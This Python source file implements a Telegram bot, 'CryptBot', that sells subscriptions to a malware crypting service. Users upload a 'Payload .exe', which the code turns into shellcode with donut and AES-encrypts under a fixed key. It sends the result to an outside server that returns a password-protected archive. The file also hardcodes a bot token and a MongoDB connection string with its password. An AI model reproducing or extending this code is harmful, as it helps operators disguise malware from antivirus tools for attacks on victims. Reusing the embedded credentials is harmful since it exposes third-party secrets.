import os
import random
import string
import requests
from datetime import datetime, timedelta, timezone
import sys
import logging
import time
from typing import Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ConversationHandler, ContextTypes
import pymongo
from pymongo import MongoClient
import donut
import warnings
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from cryptography.utils import CryptographyDeprecationWarning

# Suppress cryptography warnings
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

# Set system stdout to use UTF-8 encoding
sys.stdout.reconfigure(encoding='utf-8')

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)

# Bot credentials
API_TOKEN = '7785066369:AAGrbNMSe8LkS4CM7TD8Bj_mDNVRj-7rJlw'
ADMIN_ID = 5648376510

# MongoDB setup
MONGO_URI = 'mongodb+srv://allowdoctor:T3OtPNZe3wVgGzhQ@tgbotwd.u6kjv.mongodb.net/?retryWrites=true&w=majority&appName=Tgbotwd'
client = MongoClient(MONGO_URI)
db = client['cryptbot']
users_collection = db['premium_users']

# Ensure required directories exist
os.makedirs("downloads", exist_ok=True)
os.makedirs("converted", exist_ok=True)

# Conversation states
WAITING_FOR_FILE, CONFIRM_FILE = range(2)
ADMIN_CHAT_ID, ADMIN_DURATION, ADMIN_CONFIRM = range(2, 5)

# Duration options for premium access
DURATION_OPTIONS = {
    '1_day': {'days': 1, 'text': '1 Day'},
    '3_days': {'days': 3, 'text': '3 Days'},
    '7_days': {'days': 7, 'text': '7 Days'},
    '15_days': {'days': 15, 'text': '15 Days'},
    '30_days': {'days': 30, 'text': '30 Days'}
}

# Number of retries for API requests
MAX_RETRIES = 3

# Database functions
async def is_premium_user(user_id: int) -> bool:
    """Check if user has premium access."""
    try:
        user = users_collection.find_one({'user_id': user_id})
        if not user:
            logger.info(f"User {user_id} not found in premium users collection.")
            return False

        expiry_date = user.get('expiry_date')
        if expiry_date:
            # Ensure expiry_date is timezone-aware (UTC)
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)

            # Compare with current time (timezone-aware)
            current_time = datetime.now(timezone.utc)
            logger.info(f"Checking premium status for user {user_id}:")
            logger.info(f"Current time: {current_time}")
            logger.info(f"Expiry date: {expiry_date}")

            if current_time > expiry_date:
                logger.info(f"User {user_id} premium expired on {expiry_date}.")
                return False

        logger.info(f"User {user_id} has valid premium access.")
        return True
    except Exception as e:
        logger.error(f"Error in is_premium_user: {e}")
        return False

async def add_premium_user(user_id: int, duration_days: int):
    """Add or update premium user."""
    try:
        expiry_date = datetime.now(timezone.utc) + timedelta(days=duration_days)
        users_collection.update_one(
            {'user_id': user_id},
            {
                '$set': {
                    'user_id': user_id,
                    'expiry_date': expiry_date,  # Ensure this is timezone-aware
                    'added_by': ADMIN_ID,
                    'added_at': datetime.now(timezone.utc)
                }
            },
            upsert=True
        )
        logger.info(f"Added/updated premium user {user_id} with {duration_days} days.")
    except Exception as e:
        logger.error(f"Error in add_premium_user: {e}")

async def get_premium_expiry(user_id: int) -> Optional[datetime]:
    """Get premium expiry date for a user."""
    try:
        user = users_collection.find_one({'user_id': user_id})
        if user:
            expiry_date = user.get('expiry_date')
            if expiry_date and expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            return expiry_date
        return None
    except Exception as e:
        logger.error(f"Error in get_premium_expiry: {e}")
        return None

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Start command handler."""
    if 'processing' in context.user_data and context.user_data['processing']:
        await update.message.reply_text("⚠️ A crypt process is already running. Please wait until it completes or cancel it.")
        return

    # Define the custom keyboard layout with emojis
    keyboard = [
        ['🔐 Start Encrypt', '📅 Subscription'],
        ['🛒 Purchase', '🆘 Need Help'],
        ['❌ Cancel Job']  # New 5th button
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)

    await update.message.reply_text(
        "Welcome to CryptBot! 🔐\n\n"
        "Use the buttons below to interact with the bot.\n"
        "Contact admin for premium access.",
        reply_markup=reply_markup
    )

async def handle_menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle menu button clicks."""
    text = update.message.text

    if text == '🔐 Start Encrypt':
        await crypt(update, context)
    elif text == '📅 Subscription':
        await check(update, context)
    elif text == '🛒 Purchase':
        await purchase(update, context)
    elif text == '🆘 Need Help':
        await contact(update, context)
    elif text == '❌ Cancel Job':
        await cancel(update, context)
    else:
        await update.message.reply_text("Invalid option. Please use the menu buttons.")

# Cancel command handler
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel command handler."""
    user_id = update.effective_user.id
    
    # Clean up any stored files
    file_path = context.user_data.get('file_path')
    if file_path and os.path.exists(file_path):
        os.remove(file_path)
    
    context.user_data['processing'] = False
    await update.message.reply_text(
        "Operation cancelled. Use /crypt to start again."
    )
    return ConversationHandler.END

# Admin command handlers
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Admin command handler."""
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("⚠️ You are not authorized to use this command.")
        return ConversationHandler.END
    
    await update.message.reply_text("Please enter the chat ID of the user you want to give premium access to:")
    return ADMIN_CHAT_ID

async def admin_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle admin chat ID input."""
    try:
        chat_id = int(update.message.text)
        context.user_data['premium_chat_id'] = chat_id
        
        keyboard = [
            [InlineKeyboardButton(data['text'], callback_data=f"duration_{key}")]
            for key, data in DURATION_OPTIONS.items()
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "Select premium access duration:",
            reply_markup=reply_markup
        )
        return ADMIN_DURATION
    except ValueError:
        await update.message.reply_text("Invalid chat ID. Please enter a valid number:")
        return ADMIN_CHAT_ID

async def admin_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle admin duration selection."""
    query = update.callback_query
    await query.answer()
    
    duration_key = query.data.replace('duration_', '')
    chat_id = context.user_data['premium_chat_id']
    duration_data = DURATION_OPTIONS[duration_key]
    context.user_data['duration_days'] = duration_data['days']
    
    keyboard = [
        [
            InlineKeyboardButton("✅ Confirm", callback_data="confirm_yes"),
            InlineKeyboardButton("❌ Cancel", callback_data="confirm_no")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"📝 Confirm Premium Access\n\n"
        f"User ID: {chat_id}\n"
        f"Duration: {duration_data['text']}\n\n"
        f"Add this user as premium?",
        reply_markup=reply_markup
    )
    return ADMIN_CONFIRM

async def admin_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle admin confirmation."""
    query = update.callback_query
    await query.answer()
    
    if query.data == "confirm_yes":
        chat_id = context.user_data['premium_chat_id']
        duration_days = context.user_data['duration_days']
        
        await add_premium_user(chat_id, duration_days)
        await query.edit_message_text(
            f"✅ Premium access granted!\n\n"
            f"User ID: {chat_id}\n"
            f"Duration: {duration_days} days\n"
            f"Expiry: {(datetime.now(timezone.utc) + timedelta(days=duration_days)).strftime('%Y-%m-%d %H:%M:%S')} UTC"
        )
    else:
        await query.edit_message_text("❌ Operation cancelled.")
    
    return ConversationHandler.END

async def crypt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Crypt command handler."""
    user_id = update.effective_user.id
    
    if 'processing' in context.user_data and context.user_data['processing']:
        await update.message.reply_text("⚠️ A crypt process is already running. Please wait until it completes or cancel it.")
        return ConversationHandler.END

    if not await is_premium_user(user_id) and user_id != ADMIN_ID:
        await update.message.reply_text(
            "⚠️ Premium Access Required\n\n"
            "You need premium access to use this command.\n"
            "Please contact the administrator to purchase a subscription."
        )
        return ConversationHandler.END
    
    await update.message.reply_text(
        "📤 Please upload your Payload .exe file.\n"
        "Send /cancel to stop the process."
    )
    context.user_data['processing'] = True
    return WAITING_FOR_FILE

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle uploaded file."""
    try:
        file = update.message.document

        if not file.file_name.lower().endswith('.exe'):
            await update.message.reply_text("❌ File format not supported. Please upload a valid .exe file.")
            context.user_data['processing'] = False
            return ConversationHandler.END

        random_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + f"_{update.message.chat.id}.exe"
        file_path = os.path.join("downloads", random_filename)
        
        new_file = await file.get_file()
        await new_file.download_to_drive(file_path)

        keyboard = [
            [InlineKeyboardButton("✅ Yes", callback_data="yes")],
            [InlineKeyboardButton("❌ No", callback_data="no")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "Is this the correct file?",
            reply_markup=reply_markup
        )

        context.user_data['file_path'] = file_path
        return CONFIRM_FILE

    except Exception as e:
        logger.error(f"Error in handle_file: {e}")
        await update.message.reply_text("An error occurred. Please try again.")
        context.user_data['processing'] = False
        return ConversationHandler.END

async def confirm_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle file confirmation."""
    query = update.callback_query
    await query.answer()

    file_path = context.user_data.get('file_path')

    if query.data == "yes":
        output_file = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + f"_{query.message.chat.id}.bin"
        output_path = os.path.join("converted", output_file)
        try:
            # Convert the .exe file to a .bin file
            shellcode = donut.create(file=file_path, output=output_path)
            
            # Encrypt the .bin file
            encrypted_file_path = encrypt_bin_file(output_path)
            
            # Show animated text while processing
            await query.edit_message_text(
                "🔄 Processing your file...\n"
                "🟩🟩🟩⬛⬛⬛⬛⬛⬛⬛ (30%)"
            )
            time.sleep(2)  # Simulate processing delay
            await query.edit_message_text(
                "🔄 Processing your file...\n"
                "🟩🟩🟩🟩🟩⬛⬛⬛⬛⬛ (50%)"
            )
            time.sleep(2)  # Simulate processing delay
            await query.edit_message_text(
                "🔄 Processing your file...\n"
                "🟩🟩🟩🟩🟩🟩🟩🟩⬛⬛ (80%)"
            )
            time.sleep(2)  # Simulate processing delay

            # Send the encrypted .bin file to the API
            try:
                with open(encrypted_file_path, 'rb') as bin_file:
                    response = requests.post(
                        'https://sigyllly-demo-docker-gradio.hf.space/process',
                        files={'file': bin_file},
                        timeout=300  # Increase timeout to 300 seconds (5 minutes)
                    )
                
                if response.status_code == 200:
                    # Extract the password from the headers
                    password = response.headers.get('X-Password')
                    if not password:
                        await query.edit_message_text("❌ Invalid response from the server. Missing password in headers.")
                        context.user_data['processing'] = False
                        return ConversationHandler.END

                    # Extract the .7z file from the response body
                    archive_filename = response.headers.get('Content-Disposition', '').split('filename=')[-1].strip('"')
                    if not archive_filename:
                        archive_filename = f"processed_{random.randint(1000, 9999)}.7z"

                    # Show "Processing 100% completed" and wait for 30 seconds
                    await query.edit_message_text(
                        "✅ Processing Completed!\n"
                        "🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩 (100%)\n"
                        "Please wait while we finalize the file..."
                    )
                    time.sleep(5)  # Wait for 5 seconds to ensure the 7zip file is fully generated

                    # Send the .7z file and password to the user
                    await query.message.reply_document(
                        document=response.content,
                        filename=archive_filename,
                        caption=f"✅ File processed successfully! \n🔑 Password: {password}"
                    )

                    # Mark process as finished
                    context.user_data['processing'] = False
                    return ConversationHandler.END
                else:
                    await query.edit_message_text("❌ Error occurred while processing the file.")
                    context.user_data['processing'] = False
                    return ConversationHandler.END

            except requests.exceptions.Timeout:
                await query.edit_message_text("❌ The server took too long to respond. Please try again later.")
                context.user_data['processing'] = False
                return ConversationHandler.END

            except Exception as e:
                logger.error(f"Error in confirm_file: {e}")
                await query.edit_message_text(text="❌ An unexpected error occurred. Please try again later.")
                context.user_data['processing'] = False
                if os.path.exists(file_path):
                    os.remove(file_path)
                return ConversationHandler.END

        except Exception as e:
            logger.error(f"Error in confirm_file: {e}")
            await query.edit_message_text(text="❌ An unexpected error occurred. Please try again later.")
            context.user_data['processing'] = False
            if os.path.exists(file_path):
                os.remove(file_path)
            return ConversationHandler.END
    else:
        await query.edit_message_text("❌ Operation cancelled. Use /crypt to try again.")
        context.user_data['processing'] = False
        if os.path.exists(file_path):
            os.remove(file_path)
        return ConversationHandler.END

# Check command handler
async def check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check command handler."""
    if 'processing' in context.user_data and context.user_data['processing']:
        await update.message.reply_text("⚠️ A crypt process is already running. Please wait until it completes or cancel it.")
        return

    user_id = update.effective_user.id
    expiry_date = await get_premium_expiry(user_id)
    
    if expiry_date:
        await update.message.reply_text(
            f"✅ Your premium subscription is valid until {expiry_date.strftime('%Y-%m-%d %H:%M:%S')} UTC"
        )
    else:
        await update.message.reply_text("⚠️ You do not have a valid premium subscription.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Error handler."""
    try:
        logger.error(f'Error: {context.error} caused by update: {update}')
        if update and update.message:
            await update.message.reply_text(
                "❌ An error occurred. Please try again or use /crypt to start over."
            )
    except Exception as e:
        logger.error(f"Error in error handler: {e}")

def encrypt_bin_file(file_path: str) -> str:
    """Encrypt the .bin file using AES encryption."""
    key = "MyFixedEncryptionKey".encode('utf-8')

    if len(key) > 16:
        key = key[:16]
    elif len(key) < 16:
        key = key + b'\x00' * (16 - len(key))

    iv = key[:16]
    encrypted_file_path = os.path.join("converted", f"loader_encrypted_{random.randint(1000, 9999)}.bin")

    with open(file_path, "rb") as file:
        file_data = file.read()

    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(file_data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(encrypted_file_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)

    return encrypted_file_path

async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Contact command handler."""
    await update.message.reply_text(
        "For any inquiries or support, please contact us at: @Nexcyte, @adbosts"
    )

# Command handler for 'purchase'
async def purchase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Purchase command handler."""
    keyboard = [
        [InlineKeyboardButton("🛒 Purchase", url="https://t.me/adbosts")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "To purchase premium access, click the button below:",
        reply_markup=reply_markup
    )

def main():
    """Main function to start the bot."""
    print("Starting bot...")
    try:
        # Create the Application
        application = Application.builder().token(API_TOKEN).build()

        # Add handlers for the new commands
        application.add_handler(CommandHandler('contact', contact))
        application.add_handler(CommandHandler('purchase', purchase))

        # Add premium management conversation handler
        admin_handler = ConversationHandler(
            entry_points=[CommandHandler('admin', admin)],
            states={
                ADMIN_CHAT_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_chat_id)],
                ADMIN_DURATION: [CallbackQueryHandler(admin_duration, pattern=r'^duration_')],
                ADMIN_CONFIRM: [CallbackQueryHandler(admin_confirm, pattern=r'^confirm_')]
            },
            fallbacks=[CommandHandler('cancel', cancel)],  # Add cancel as a fallback
            per_message=False
        )

        # Add the main conversation handler for the encryption process
        conv_handler = ConversationHandler(
            entry_points=[
                CommandHandler('crypt', crypt),  # Handle /crypt command
                MessageHandler(filters.Text(['🔐 Start Encrypt']), crypt)  # Handle menu button
            ],
            states={
                WAITING_FOR_FILE: [MessageHandler(filters.Document.ALL, handle_file)],  # Handle file uploads
                CONFIRM_FILE: [CallbackQueryHandler(confirm_file)]  # Handle file confirmation
            },
            fallbacks=[CommandHandler('cancel', cancel)],  # Handle /cancel command
            per_message=False
        )

        # Add all handlers
        application.add_handler(admin_handler)
        application.add_handler(conv_handler)
        application.add_handler(CommandHandler('start', start))  # Add start command handler
        application.add_handler(CommandHandler('check', check))
        application.add_handler(CommandHandler('cancel', cancel))  # Add cancel command handler
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_menu_buttons))  # Add menu button handler
        application.add_error_handler(error_handler)

        # Start the bot
        print("Bot is running. Press Ctrl+C to stop.")
        application.run_polling(allowed_updates=Update.ALL_TYPES)

    except Exception as e:
        logger.critical(f"Critical error in main: {e}")
        
        
if __name__ == '__main__':
    main()
